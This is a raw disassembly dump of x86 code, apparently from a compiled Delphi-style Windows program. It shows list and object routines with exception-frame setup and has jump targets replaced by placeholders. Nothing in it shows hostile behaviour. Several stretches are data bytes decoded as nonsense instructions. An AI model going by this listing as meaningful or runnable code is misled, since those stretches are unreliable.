mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_4070a8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4423dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x19 ] 0x0
test ebx ebx
je r-xdata
add [ eax ] al
add [ edx ] al
add ah cl
add eax 0xffffffdc
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
inc esi
dec ebx
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4418ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442641
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x20
mov edx ebx
call sub_4070a8
mov eax [ eax + 0x1c ]
retn
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4423e4
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x18 ]
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
xor eax eax
push ebp
push sub_4423ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_4305a0
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x4 ]
call sub_418a80
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov [ ebp - 0x19 ] al
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x11 ] 0x1
call sub_4061a4
jmp r-xdata
retn
movzx edx [ ebp - 0x19 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_440d30
insd
or al 0x44
add [ edi + 0xc ] dh
inc esp
add [ ecx + 0x5500440c ] al
or al 0x44
add [ ebp + 0xc ] bl
inc esp
add [ ebp + 0xc ] ah
inc esp
add bl ch
or al 0x44
add ch dh
or al 0x44
add bh bh
or al 0x44
add [ ebx - 0x3cffbbf4 ] bh
or al 0x44
add bl cl
or al 0x44
add bl dl
or al 0x44
add bl bl
or al 0x44
add bl ah
or al 0x44
add [ ebx - 0x74ffbbf4 ] dh
or al 0x44
add [ ebx - 0x64ffbbf4 ] dl
or al 0x44
add [ ebx - 0x54ffbbf4 ] ah
or al 0x44
add [ ecx ] dl
or eax 0xd1b0044
inc esp
add [ 0x900440d ] ah
or eax 0x50044
add [ eax ] al
add eax 0xa6b0cdb
retn
sub_440da2
int1
sbb al 0xd1
xchg ebp eax
cmp [ esi + 0x30 ] bl
or eax 0x240044
add [ eax + eax ] dh
add [ eax ] al
movsb [ edi ] [ esi ]
sbb al 0x40
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ ebx * 4 - 0x62bfffc0 ] dh
push es
inc esp
mov al [ 0xfffffffffb15f98e ]
movsd [ edi ] [ esi ]
leave
aam 0x48
or eax 0x280044
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add al [ eax ]
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
add al [ eax ]
add ah bl
pop edx
inc edx
add [ eax ] dl
add [ eax ] al
add [ ebx ] cl
inc esi
push esi
imul esp [ ebp + 0x77 ] 0x694c7265
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx al
push 0x0
pop esi
0x8f824eb1 0xf1a7
xlat
popfd
rol [ edx ] cl
dec eax
or eax 0x280044
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
xor eax ebp
dec eax
loop r-xdata
xor [ 0x240044 ] cl
cmp cl [ eax + 0xd ]
inc esp
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x204cf9ea ] cl
mov ebp 0xbeb94045
pop ds
and edi [ edx - 0x7ba3ccef ]
or eax 0x2c0044
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add ah dh
imul ebp [ ebp + 0x2 ] 0x12000000
add ah cl
cmove eax [ eax ]
inc esp
add ah dh
push edx
cmove eax [ eax ]
dec ebp
add bh bh
[ ecx ]
adc [ eax + eax + 0x42 ] al
add ah dh
jmp [ ebp + 0x10 ]
add al [ eax ]
add ah bl
pop edx
inc edx
add [ eax + eax ] dl
add [ eax ] al
adc eax [ esi + 0x45 ]
js r-xdata
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x63 ] dl
inc eax
add [ ebp + edx * 2 + 0x17a40040 ] ah
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + ecx + 0xc0044 ] al
add [ eax ] al
inc eax
adc al [ eax ]
and [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
test [ edx ] cl
inc esp
add [ eax + eax ] cl
add [ eax ] al
or eax 0x6c654846
jo r-xdata
movsb [ edi ] [ esi ]
adc al 0x44
add [ esi + 0x2b00440e ] dl
inc esp
add [ ebp + ecx + 0x44 ] dl
add [ eax ] al
jl r-xdata
adc [ eax + eax + 0x42 ] al
add ah dh
call [ eax ]
adc [ eax + eax + 0x42 ] eax
add ah dh
inc [ ebx + 0x11 ]
inc esp
add [ edx ] al
hlt
outsb
push esi
imul esp [ ebp + 0x77 ] 0x694c7265
jae r-xdata
add [ eax ] al
add [ eax ] al
mov edi 0x3400440f
add [ eax ] al
add [ esp + ebx + 0x56ac0040 ] ah
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax + 0x34004058 ] dh
popfd
inc eax
add [ eax - 0x63 ] al
cmove eax [ eax ]
inc esp
add [ esp + edx + 0xe960044 ] ah
inc esp
add [ ebx ] ch
inc ebx
adc [ eax + eax + 0x42 ] eax
add ah dh
call [ ebp + 0x42004411 ]
add [ eax + edx + 0x1c0040 ] bl
add [ eax ] al
pop es
inc esi
dec eax
popad
outsb
insb
add al [ gs : eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax ] ah
add [ eax ] al
add [ ecx ] cl
inc esi
dec eax
insb
jo r-xdata
add al [ eax ]
add [ eax + edx + 0x180040 ] bl
add [ eax ] al
or al [ esi + 0x4d ]
imul ebp [ esi + 0x43 ] 0x696b6f6f
add al [ gs : eax ]
sub_441541
adc eax 0x100044
add [ eax ] al
cmp al 0x14
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
or al [ eax + eax + 0x4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
hlt
sub_4416bc
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
call sub_441690
mov eax ebx
mov edx [ rw-data ]
mov ecx r-xdata
call sub_409cf8
cmp [ ebx ] 0x0
setne al
pop ebx
pop ebp
retn
xor eax eax
mov [ ebx ] eax
sub_4416fc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
lea eax [ edi + 0x4 ]
mov edx esi
call sub_409ccc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_441740
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x20 ]
xor edx edx
call sub_4070a8
mov [ esi + 0x18 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4417a4
push ebx
push esi
push edi
push ebp
call sub_405bb4
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
inc edi
mov eax [ ebp + 0x14 ]
call sub_4055f0
mov eax [ ebp + 0x10 ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4055e0
test bl bl
jle r-xdata
lea eax [ ebp + 0xc ]
call sub_409cb4
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4305a0
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax esi
call sub_4055f0
dec edi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_405b5c
sub_44181c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4418bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4416fc
mov esi eax
mov eax [ ebx + 0x18 ]
mov [ esi + 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4303e0
mov edx [ ebx + 0x18 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_418a80
test al al
je r-xdata
inc [ ebx + 0x18 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
test edx edx
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4303e0
mov ecx r-xdata
call sub_409cf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4418c3
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub edx 0xfffffff8
sub_4418ec
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax edi
call sub_409cb4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x4 ]
mov eax edi
call sub_409ccc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov edx ebx
mov eax [ esi + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x4 ]
mov eax edi
call sub_409ccc
sub_44195c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_4305a0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_44198c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_441a30
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xd ] 0x0
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
lea eax [ edi + 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441a37
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp - 0xd ] al
jmp r-xdata
mov eax [ edi + 0x10 ]
mov edx esi
call sub_4305a0
mov eax [ eax + 0x4 ]
push eax
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov ecx eax
mov edx sub_441a44
pop eax
call sub_418a80
test al al
je r-xdata
sub_441a44
and al 0x22
jpo r-xdata
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_441cec
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
scasb [ edi ]
push ds
adc eax [ ebx - 0x46 ]
salc
cmp al 0x32
clc
div [ eax - 0x7b ]
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441cf3
lea eax [ ebp - 0x30 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x20 ] eax
xor edx edx
push ebp
push sub_441cc7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
dec eax
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_407134
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xa
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
jmp r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x20 ]
call sub_4303e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_441caa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_4305a0
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
call sub_4055f0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_4305a0
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
xor edx edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0xa0 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov ebx eax
test ebx ebx
jl r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
xor eax eax
push ebp
push sub_441c0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_4055f0
retn
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_4305a0
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
call sub_4055f0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx ebx
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0x3c ]
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
sub_441cfc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_441d70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_409cf8
mov eax [ ebp - 0x8 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441d77
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_441d90
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44200b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x20
mov edx [ ebp - 0x18 ]
call sub_4070a8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
inc ebx
xor esi esi
cmp [ ebp - 0x1c ] 0x1
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0x1c ]
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_441cfc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0xc ]
call sub_409ccc
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_409cf8
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_441cfc
pop ecx
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_409cf8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442012
lea eax [ ebp - 0x34 ]
call sub_409cb4
lea eax [ ebp - 0x30 ]
call j_sub_4068a0
lea eax [ ebp - 0x2c ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_407e40
lea eax [ ebp - 0x10 ]
call sub_409cb4
lea eax [ ebp - 0xc ]
call sub_409cb4
retn
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_441cfc
pop ecx
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x20 ] eax
xor edx edx
push ebp
push sub_441fa7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
test eax eax
jl r-xdata
inc ebx
xor esi esi
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_441cfc
pop ecx
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_409cf8
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
inc esi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
call sub_4055f0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4305a0
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_409cf8
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_44203c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44213a
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4420ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4418ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4420f5
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
inc esi
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x14 ]
mov ecx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_4305a0
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_4420f5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442141
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_442148
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_442208
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0x20 ]
mov edx ebx
call sub_4070a8
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44220f
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
